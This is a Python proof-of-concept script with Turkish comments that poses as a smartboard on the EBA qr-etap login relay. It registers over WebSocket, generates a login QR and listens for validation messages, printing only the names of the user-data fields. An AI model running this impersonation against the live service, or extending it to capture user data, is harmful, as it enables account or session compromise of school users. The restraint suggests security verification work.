#!/usr/bin/env python3
"""Tahta taklidi: qr-etap rölesine tahta gibi bağlan, PRDS QR üret, dinle.

Kullanım:
  python3 tahta_relay_repro.py [--mac AA:BB:CC:DD:EE:FF] [--dinle-sn 90]

Parola/jeton/kişisel bilgi toplamaz; validation gövdesindeki kullanıcı
alanlarının SADECE isimlerini gösterir, değerleri göstermez.
"""
import argparse
import asyncio
import base64
import io
import json
import random
import sys
import urllib.parse
import urllib.request

RELAY = "https://qr-etap.eba.gov.tr"
WS = "wss://qr-etap.eba.gov.tr/api/v1/ws"


def rastgele_mac():
    return "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randrange(256) for _ in range(5))


def check(uuid):
    url = f"{RELAY}/api/v1/check/{urllib.parse.quote(uuid)}"
    with urllib.request.urlopen(url, timeout=10) as r:
        return json.load(r)


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mac", default=rastgele_mac())
    ap.add_argument("--dinle-sn", type=int, default=90)
    ap.add_argument("--qr-out", default="tahta-canli-qr.png")
    args = ap.parse_args()

    import websockets
    url = f"{WS}/{urllib.parse.quote(args.mac, safe='')}"
    print("MAC:", args.mac)
    async with websockets.connect(url, max_size=1 << 20) as ws:
        print("wss bağlandı.")
        # register denemeleri: önce greeter'ın birebir yükü (0.2.6 qrlogin.py
        # akışı), sonra yalın hali. {"type": ...} röleden yanıtsız kalıyor
        # (canlı doğrulandı), o yüzden listede yok.
        for aday in ({"action": "register", "sender": "lightdm"},
                     {"action": "register"}):
            payload = json.dumps(aday)
            await ws.send(payload)
            print("gönderildi:", payload)
            try:
                ham = await asyncio.wait_for(ws.recv(), timeout=8)
            except asyncio.TimeoutError:
                print("cevap yok (8 sn), sonraki aday...")
                continue
            print("alındı:", ham[:300])
            try:
                veri = json.loads(ham)
            except Exception:
                continue
            uuid = veri.get("uuid")
            if uuid:
                print("uuid:", uuid)
                print("expire_at:", veri.get("expire_at"))
                try:
                    print("check:", check(uuid))
                except Exception as e:
                    print("check hatası:", str(e)[:120])
                # QR üret
                import qrcode
                img = qrcode.make(uuid)
                img.save(args.qr_out)
                print(f"QR kaydedildi: {args.qr_out} (telefonla okutun)")
                # validation dinle
                print(f"{args.dinle_sn} sn validation dinleniyor...")
                try:
                    async def dinle():
                        async for msg in ws:
                            try:
                                v = json.loads(msg)
                            except Exception:
                                print("ham mesaj:", msg[:200])
                                continue
                            if isinstance(v, dict) and "user_data" in v:
                                ud = v["user_data"] or {}
                                keys = sorted(ud.keys()) if isinstance(ud, dict) else type(ud).__name__
                                print(f"VALIDATION geldi: type={v.get('type')} status={v.get('status')} user_data_alanları={keys}")
                            else:
                                print("mesaj:", str(msg)[:300])
                    await asyncio.wait_for(dinle(), timeout=args.dinle_sn)
                except asyncio.TimeoutError:
                    print("Süre doldu, validation gelmedi.")
                return 0
        print("Kayıt cevabı alınamadı.")
        return 1


sys.exit(asyncio.run(main()))
